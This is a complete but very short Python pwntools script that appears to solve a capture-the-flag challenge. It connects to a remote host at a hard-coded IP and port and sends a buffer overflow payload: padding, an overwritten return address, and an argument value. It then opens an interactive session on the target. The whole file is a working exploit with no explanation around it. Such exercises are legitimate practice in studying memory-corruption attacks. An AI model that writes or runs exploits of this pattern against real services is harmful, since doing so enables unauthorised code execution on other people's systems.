from pwn import *

p = remote('159.65.13.76', 33106)

payload = 'A'*28+p32(0x8048556)+'AAAA'+p32(0x1337)

print p.recv()
p.sendline(payload)
p.interactive()
